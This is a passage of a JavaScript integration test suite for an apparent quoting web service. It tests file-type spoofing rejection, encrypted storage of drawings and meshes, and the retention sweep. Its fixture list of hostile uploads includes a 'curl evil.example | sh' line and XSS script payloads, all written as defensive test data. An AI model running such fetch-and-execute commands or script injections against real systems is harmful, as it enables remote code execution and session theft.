  const heic = Buffer.concat([Buffer.from([0, 0, 0, 0x18]), Buffer.from("ftypheic"), Buffer.alloc(40)]);
  const dwg = Buffer.concat([Buffer.from("AC1027"), Buffer.alloc(64)]);
  const dxfFile = fs.readFileSync(path.join(parts, "dxf_inch_guard.dxf"));
  const page = Buffer.from("<!doctype html><html><body><script>alert(document.domain)</script></body></html>");
  const hostile = [
    ["an HTML page named .pdf", "invoice.pdf", page],
    ["an HTML page named .png", "photo.png", page],
    ["a script named .jpg", "photo.jpg", Buffer.from("#!/bin/sh\ncurl evil.example | sh\n")],
    ["a PDF named .png", "drawing.png", pdf],
    ["a Windows program named .dwg", "part.dwg", Buffer.concat([Buffer.from("MZ"), Buffer.alloc(120)])],
    ["a DWG named .dxf", "part.dxf", dwg],
    ["a ZIP named .heic", "IMG_0001.heic", Buffer.concat([Buffer.from("PK\u0003\u0004"), Buffer.alloc(60)])],
    ["a PNG named .webp", "photo.webp", png],
    ["an SVG with script named .jpeg", "logo.jpeg", Buffer.from('<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>')],
    ["an empty .pdf", "empty.pdf", Buffer.alloc(0)],
  ];
  let n = 0;
  for (const [what, name, data] of hostile) {
    const r = await s.rfq(fields(++n), [{ name, data }], { ip: ip() });
    assert.strictEqual(r.status, 400, `${what} → ${r.status} ${r.text.slice(0, 120)}`);
    assert.strictEqual(r.body.code, "content-mismatch", what);
    assert.strictEqual(s.files("rfq-drawings").length, before, `${what} was deleted before the answer`);
  }
  // Each accepted type, genuine, is still taken.
  const genuine = [["print.pdf", pdf], ["photo.png", png], ["photo.jpg", jpeg], ["photo.JPEG", jpeg], ["photo.webp", webp], ["IMG_0002.HEIC", heic], ["part.dwg", dwg], ["outline.dxf", dxfFile]];
  for (const [name, data] of genuine) {
    const r = await s.rfq(fields(++n), [{ name, data }], { ip: ip() });
    assert.strictEqual(r.status, 201, `${name} → ${r.status} ${r.text.slice(0, 160)}`);
  }
  assert.strictEqual(s.files("rfq-drawings").length, before + genuine.length);
  // Nothing was stored for the refused ones, and nothing refused reached the shop's log as a name or a path.
  assert.ok(!s.log().includes("invoice.pdf") && !s.log().includes("alert(document.domain)"));
});

test("after the merge: quote drawings and request attachments are encrypted at rest and covered by the retention sweep", async () => {
  const key = crypto.randomBytes(36).toString("base64"); // a throwaway key made here; never written anywhere
  const jwtSecret = crypto.randomBytes(32).toString("hex");
  let s = await live.start({ env: { NORD_FILE_ENC_KEY: key, JWT_SECRET: jwtSecret } });
  const me = "203.0.113.90";
  try {
    const up = await s.upload([{ name: "cube.stl", data: cube }], { ip: me });
    const mats = (await s.get("/api/materials?process=cnc", { ip: me })).body;
    const q = await s.post("/api/quote", { parts: [{ partId: up.body.parts[0].partId, materialSlug: mats[0].slug, quantity: 1, process: "cnc", subProcess: "milling" }] }, { ip: me });
    assert.strictEqual((await s.upload([{ field: "drawing", name: "print.pdf", data: pdf }], { url: `/api/quote/${q.body.quoteId}/drawing`, ip: me })).status, 200);
    assert.strictEqual((await s.rfq({ contactName: "A Buyer", email: "buyer@example.com", notes: "kept" }, [{ name: "print.pdf", data: pdf }], { ip: me })).status, 201);
    const kept = { quote: s.files("quote-drawings"), rfq: s.files("rfq-drawings") };
    assert.deepStrictEqual([kept.quote.length, kept.rfq.length], [1, 1]);
    for (const [folder, names] of [["quote-drawings", kept.quote], ["rfq-drawings", kept.rfq]]) {
      assert.ok(/^[0-9a-f-]{36}\.pdf\.enc$/.test(names[0]), `${folder}: ${names[0]}`);
      const bytes = fs.readFileSync(path.join(s.dir(folder), names[0]));
      assert.strictEqual(bytes.subarray(0, 4).toString("latin1"), "SEF1");
      assert.ok(!bytes.includes(Buffer.from("%PDF")), `${folder}: the stored file is not readable on disk`);
    }
    // Stop. Age every file by three days, and leave strays in both folders: an attachment whose request
    // was refused, a drawing nobody points at, each old; and one that is only an hour old.
    const tmpDir = s.tmp;
    await s.stop({ keep: true });
    const old = new Date(Date.now() - 72 * 3600 * 1000);
    const recent = new Date(Date.now() - 3600 * 1000);
    for (const folder of ["quote-drawings", "rfq-drawings"]) {
      const dir = path.join(tmpDir, "data", folder);
      for (const f of fs.readdirSync(dir)) fs.utimesSync(path.join(dir, f), old, old);
      for (const [name, when] of [[`${crypto.randomUUID()}.pdf.enc`, old], [`${crypto.randomUUID()}.pdf`, old], [`${crypto.randomUUID()}.png`, recent]]) {
        fs.writeFileSync(path.join(dir, name), Buffer.alloc(2048, 7));
        fs.utimesSync(path.join(dir, name), when, when);
      }
    }
    s = await live.start({ tmpDir, env: { NORD_FILE_ENC_KEY: key, JWT_SECRET: jwtSecret } });
    assert.ok(/File retention: removed 4 drawing file\(s\) no quote, order or request refers to/.test(s.log()), s.log().split("\n").filter((l) => /retention/i.test(l)).join(" | "));
    for (const [folder, names] of [["quote-drawings", kept.quote], ["rfq-drawings", kept.rfq]]) {
      const now = s.files(folder);
      assert.ok(now.includes(names[0]), `${folder}: the drawing a ${folder === "quote-drawings" ? "quote" : "request"} points at was kept, whatever its age`);
      assert.strictEqual(now.length, 2, `${folder}: the referenced file and the hour-old stray remain (${now.join(", ")})`);
      assert.strictEqual(now.filter((f) => f.endsWith(".png")).length, 1, "a stray younger than a day is left for now");
    }
    // The kept drawing still opens for the buyer's quote: the sweep did not touch what is in use.
    assert.strictEqual((await s.get(`/api/quote/${q.body.quoteId}`, { ip: me })).body.drawingFileName, "print.pdf");
    assert.ok(!s.log().includes(key), "the key is not in the log");
  } finally { await s.stop(); }
});

test("a dense model adds kilobytes to the database, not megabytes: its preview mesh is a file, encrypted with the rest, and survives a restart", async () => {
  // A sphere of 14,160 triangles: its preview mesh is 2.4 MB of JSON, which used to be the part's database row.
  const sphere = (() => {
    const n = 60, r = 25, tris = [];
    const P = (i, j) => { const t = Math.PI * i / n, p = Math.PI * j / n; return [r * Math.sin(t) * Math.cos(p), r * Math.sin(t) * Math.sin(p), r * Math.cos(t)]; };
    for (let i = 0; i < n; i++) for (let j = 0; j < 2 * n; j++) { const a = P(i, j), b = P(i + 1, j), c = P(i + 1, j + 1), d = P(i, j + 1); if (i > 0) tris.push([a, b, d]); if (i < n - 1) tris.push([b, c, d]); }
    const buf = Buffer.alloc(84 + tris.length * 50); buf.writeUInt32LE(tris.length, 80);
    let o = 84; for (const t of tris) { o += 12; for (const v of t) for (const x of v) { buf.writeFloatLE(x, o); o += 4; } o += 2; }
    return buf;
  })();
  const key = crypto.randomBytes(36).toString("base64");
  const jwtSecret = crypto.randomBytes(32).toString("hex");
  let s = await live.start({ env: { NORD_FILE_ENC_KEY: key, JWT_SECRET: jwtSecret } });
  const me = "203.0.113.95";
  try {
    const dbFile = path.join(s.dataDir, "quoting.db");
    const before = fs.statSync(dbFile).size;
    const ups = [];
    for (let i = 0; i < 3; i++) {
      const r = await s.upload([{ name: `sphere-${i}.stl`, data: sphere }], { ip: me });
      assert.strictEqual(r.status, 200, r.text.slice(0, 200));
      assert.strictEqual(r.body.parts.length, 1, JSON.stringify(r.body.errors));
      ups.push(r.body.parts[0]);
    }
    const grew = fs.statSync(dbFile).size - before;
    // The mesh is not in the upload answer (it is megabytes): the answer says where it is, and the
    // preview route streams it, decrypted, to the browser that holds the part's key.
    assert.deepStrictEqual(ups[0].meshPreview.positions, []);
    const preview = (srv, u) => srv.get(u.mesh.url, { ip: me, headers: { "X-Part-Key": u.editKey } });
    const firstMesh = await preview(s, ups[0]);
    assert.strictEqual(firstMesh.status, 200, firstMesh.text.slice(0, 200));
    const meshJson = firstMesh.text.length;
    assert.ok(meshJson > 2 * 1024 * 1024, `the mesh is ${meshJson} bytes of JSON`);
    assert.ok(grew < 200 * 1024, `three dense parts grew the database by ${grew} bytes (it was ${3 * meshJson} before this change)`);
    console.log(`       (three 14,160-triangle parts: database +${(grew / 1024).toFixed(0)} kB; their meshes, ${(3 * meshJson / 1e6).toFixed(1)} MB, are in files)`);
    const payloadFiles = s.files("part-payloads");
    // With a key set, each part's measurements are in an encrypted file as well as its mesh: nothing of the shape is in the database row.
    assert.deepStrictEqual(payloadFiles.slice().sort(), ups.flatMap((u) => [`${u.partId}.geometry.json.enc`, `${u.partId}.mesh.json.enc`]).sort());
    for (const f of payloadFiles) {
      const bytes = fs.readFileSync(path.join(s.dir("part-payloads"), f));
      assert.strictEqual(bytes.subarray(0, 4).toString("latin1"), "SEF1");
      assert.ok(!bytes.includes(Buffer.from("positions")), "the mesh is not readable on disk");
    }
    assert.ok(!fs.readFileSync(dbFile).includes(Buffer.from('"positions":[2')), "and it is not in the database file");
    // Price, then reopen the quote after a restart: the preview comes back from the file.
    const mats = (await s.get("/api/materials?process=cnc", { ip: me })).body;
    const q = await s.post("/api/quote", { parts: ups.map((u) => ({ partId: u.partId, materialSlug: mats[0].slug, quantity: 1, process: "cnc", subProcess: "milling" })) }, { ip: me });
    assert.strictEqual(q.status, 200, q.text.slice(0, 200));
    const tmpDir = s.tmp;
    await s.stop({ keep: true });
    s = await live.start({ tmpDir, env: { NORD_FILE_ENC_KEY: key, JWT_SECRET: jwtSecret } });
    assert.ok(!/Part payloads: moved/.test(s.log()), "nothing to migrate: these rows never held a mesh");
    assert.ok(!/removed \d+ part payload file/.test(s.log()), "the sweep leaves files that have a row");
    const session = await s.get(`/api/quote/${q.body.quoteId}/session`, { ip: me });
    assert.strictEqual(session.status, 200);
    assert.ok(session.text.length < 100 * 1024, `the session answer is ${session.text.length} bytes: no mesh in it`);
    assert.deepStrictEqual(session.body.parts.map((p) => session.body.partsById[p.partId].mesh.url), ups.map((u) => u.mesh.url));
    for (const u of ups) {
      const m = await preview(s, { mesh: session.body.partsById[u.partId].mesh, editKey: session.body.partsById[u.partId].editKey });
      assert.strictEqual(m.status, 200);
      assert.strictEqual(m.body.positions.length, firstMesh.body.positions.length);
    }
    assert.deepStrictEqual((await preview(s, ups[0])).body.positions.slice(0, 300), firstMesh.body.positions.slice(0, 300), "the same vertices after the restart");
    const again = await s.post("/api/quote", { parts: ups.map((u) => ({ partId: u.partId, materialSlug: mats[0].slug, quantity: 1, process: "cnc", subProcess: "milling" })), quoteId: q.body.quoteId }, { ip: me });
    assert.strictEqual(again.body.orderTotal, q.body.orderTotal, "the same price after the restart");
    // A stray payload with no part row is swept at the next start; the real ones stay.
    await s.stop({ keep: true });
    const stray = path.join(tmpDir, "data", "part-payloads", `${crypto.randomUUID()}.mesh.json.enc`);
    fs.writeFileSync(stray, Buffer.alloc(4096, 1));
    const hourAgo = new Date(Date.now() - 3600 * 1000);
    fs.utimesSync(stray, hourAgo, hourAgo);
    s = await live.start({ tmpDir, env: { NORD_FILE_ENC_KEY: key, JWT_SECRET: jwtSecret } });
    assert.ok(/File retention: removed 1 part payload file\(s\) with no part row/.test(s.log()));
    assert.strictEqual(s.files("part-payloads").length, 6);
    assert.ok(/part preview meshes are stored encrypted/.test(s.log()));
    assert.ok(!s.log().includes(key));
  } finally { await s.stop(); }
});

run(async () => {
  for (const s of servers) await s.stop();
});
